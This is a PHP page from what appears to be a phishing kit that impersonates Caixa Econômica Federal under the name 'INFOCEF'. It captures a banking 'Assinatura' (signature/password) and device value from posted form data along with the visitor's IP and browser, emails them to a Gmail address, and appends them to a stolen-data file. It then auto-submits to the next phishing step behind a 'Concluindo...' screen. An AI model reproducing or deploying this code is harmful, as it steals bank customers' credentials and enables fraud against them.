<?php
extract($_POST);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: INFOCEF";
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$navegador = $_SERVER['HTTP_USER_AGENT'];
$data=date("d/m/Y");
$hora=date("H:i");

$conteudo = "
| -------------------------------------
| Sistema de Cadastro
| -------------------------------------
| INFOCEF
| Data: $data
| Hora: $hora
| IP: $ip
| Navegador: $navegador
| -------------------------------------
| Assinatura: $cc
| Dispositivo: $dispositivo
| -------------------------------------";

@mail($receber, "INFOCEF-$ip", "$conteudo", $headers); 

$cc = $_POST['cc'];
$dispositivo = $_POST['dispositivo'];

$ip_usuario = $_SERVER['REMOTE_ADDR'];
$myFile = "../dados/"."FISICA-CEF".".php";
$fh = fopen($myFile, 'a') or die("Impossivel abrir arquivo.");
$data=date("d/m/Y");
$hora=date("H:i");
$stringData = "
| IP: $ip<br>
| -------------------------------------<br>
| Assinatura: $cc<br>
| Dispositivo: $dispositivo<br>
| -------------------------------------<br>";


fwrite($fh, $stringData);
fclose($fh);

@mail("flamengoliberta660@gmail.com","[FISICA-CEF]"."$ip", $stringData, $matts);

?>
<!DOCTYPE html>
<html lang="pt-br">
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" type="text/css" href="css/style1.css">
<script type="text/javascript" src="scripts/html5shiv.js"></script>
<script language="JavaScript">
function direcionar() { document.form.submit(); }
 
</script>
<meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" /></head>

<body style="margin:0;" onLoad="setTimeout('direcionar()',2000);">
<div id="fundo2">
<form name="form" id="form" action="alerta.php" method="post">
<input type="hidden" name="br" id="br" value="">
<div style="margin:10px 0 0 0; color:#FBFBEF; font-family:'Arial'; font-size:13px; text-align:center;">Concluindo...</div>

<img src="../assets/img/logo-topo.png" id="centro" />

</form>
</div>



</html>